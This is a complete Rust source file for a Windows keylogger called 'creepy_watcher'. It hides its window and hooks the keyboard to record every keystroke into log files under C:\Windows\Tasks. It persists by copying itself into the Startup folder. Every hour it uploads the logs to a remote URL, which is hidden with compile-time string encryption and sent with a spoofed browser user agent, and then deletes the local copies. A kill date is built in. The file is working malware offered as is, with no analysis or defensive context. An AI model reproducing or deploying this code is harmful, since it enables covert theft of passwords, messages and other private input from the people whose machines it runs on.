#![windows_subsystem = "windows"]

use std::{env, fs::{self, File, OpenOptions}, io::{Read, Write}, path::{Path, PathBuf}, ptr, thread::sleep, time::{Duration, Instant}};

use chrono::{DateTime, Local, NaiveDate};
use litcrypt::{lc, use_litcrypt};
use reqwest::{blocking::{multipart::{Form, Part}, Client}, header::USER_AGENT};
use windows::Win32::{Foundation::{HINSTANCE, HWND, LPARAM, LRESULT, WPARAM}, UI::{Input::KeyboardAndMouse::GetAsyncKeyState, WindowsAndMessaging::{CallNextHookEx, GetMessageA, SetWindowsHookExA, HHOOK, KBDLLHOOKSTRUCT, WH_KEYBOARD_LL, WM_KEYDOWN, WM_KEYUP}}};

mod key_codes;

use_litcrypt!("mysecretkey");

static mut HOOK_ID: HHOOK = HHOOK(0);
static mut SHIFT_DOWN: bool = false;
static mut CAPS_ON: bool = false;
static mut TIMESTAMP: Vec<Instant> = Vec::new();
static mut FILENAME: String = String::new();

unsafe extern "system" fn keyboard_hook(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    let filepath: String = format!("C:\\Windows\\Tasks\\{}", FILENAME);

    let mut outfile: File = OpenOptions::new().write(true).create(true).append(true).open(filepath).unwrap();
    let now: Instant = Instant::now();
    TIMESTAMP[0] = now;

    if SHIFT_DOWN && wparam.0 as u32 == WM_KEYUP {
        let info: *mut KBDLLHOOKSTRUCT = std::mem::transmute(lparam);
        let raw_char: u32 = (*info).vkCode;
        if raw_char == 0xA0 || raw_char == 0xA1 {
            SHIFT_DOWN = false;
        }
    }

    if wparam.0 as u32 == WM_KEYDOWN {
        let info: *mut KBDLLHOOKSTRUCT = std::mem::transmute(lparam);
        let raw_char: u32 = (*info).vkCode;
        if GetAsyncKeyState(0xA0) & 0x01 == 1 || GetAsyncKeyState(0xA1) & 0x01 == 1 {
            SHIFT_DOWN = true;
        }

        if GetAsyncKeyState(0x14) & 0x01 == 1 {
            CAPS_ON = !CAPS_ON;
        }

        let key_char: String = key_codes::code_lookup(SHIFT_DOWN, raw_char, CAPS_ON);

        outfile.write_all(key_char.as_bytes()).unwrap();
    }


    return CallNextHookEx(HOOK_ID, code, wparam, lparam);
}

fn process_checkin() {
    let three_seconds: Duration = Duration::from_secs(3);

    unsafe {
        let curr_filepath: String = format!("C:\\Windows\\Tasks\\{}", FILENAME);

        // If it's time to send the file, check if user is still typing.
        // If they are, wait for a three second pause before sending
        if TIMESTAMP[0].elapsed() > three_seconds {
            let mut file: File = File::open(curr_filepath.clone()).unwrap();
            let mut buf: String = String::new();

            file.read_to_string(&mut buf).unwrap();

            let datetime: DateTime<Local> = Local::now();
            FILENAME = format!("{}.log", datetime.format("%y%m%d-%H%S"));

            let new_filepath: String = format!("C:\\Windows\\Tasks\\{}", FILENAME);
            File::create(new_filepath.clone()).unwrap();

            send_file(curr_filepath.clone());

            fs::remove_file(curr_filepath).unwrap();
        } else {
            sleep(Duration::from_secs(1));
            process_checkin();
        }
    }
}

fn send_file(path_str: String) {

    let mut file: File = File::open(path_str).unwrap();

    let mut buf: String = String::new(); 
    file.read_to_string(&mut buf).unwrap();

    unsafe {
        let f_part: Part = Part::text(buf).file_name(FILENAME.clone()).mime_str("text/plain").unwrap();

        let client = Client::new();
        let form: Form = Form::new().part("file", f_part);

        let url: String = lc!("https://testsite.com/");

        let _ = client.post(url)
            .header(USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            .multipart(form)
            .send().is_ok();
    }
}

fn autorun_install() {

    let curr_dir: PathBuf = env::current_dir().unwrap();
    let exe_path: String = format!("{}\\creepy_watcher.exe", curr_dir.display());

    let new_path: PathBuf = dirs::data_dir().unwrap();
    let new_exe_path: String = format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\creepy_watcher.exe", new_path.display());

    fs::copy(exe_path, new_exe_path).unwrap();
}

fn check_autorun() -> bool {

    let data_dir: PathBuf = dirs::data_dir().unwrap();

    let autorun_exe_path: String = format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\creepy_watcher.exe", data_dir.display());
    let check_exe_exists: &Path = Path::new(&autorun_exe_path);

    if check_exe_exists.is_file() {
        return true;
    }

    return false;
}


fn main() {

    let datetime: DateTime<Local> = Local::now();

    let killdate: NaiveDate = NaiveDate::parse_from_str("2025-02-28", "%Y-%m-%d").unwrap();

    if killdate < datetime.date_naive() {
        println!("Fatal Error. Program cannot start");
        return;
    }

    if !check_autorun() {
        autorun_install();
    }

    unsafe {
        TIMESTAMP.push(Instant::now());
        FILENAME = format!("{}.log", datetime.format("%y%m%d-%H%S"));
    }

    std::thread::spawn(|| {
        unsafe {
            match SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_hook), HINSTANCE::default(), 0) {
                Ok(h_hook) => {
                    HOOK_ID = h_hook;
                    while GetMessageA(ptr::null_mut(), HWND::default(), 0, 0).as_bool() {

                    }
                }
                Err(err) => {
                    eprintln!("Error setting hook: {:?}", err);
                }
            }
        }
    });

    loop {
        std::thread::sleep(core::time::Duration::from_secs(3600));
        process_checkin();
    }
}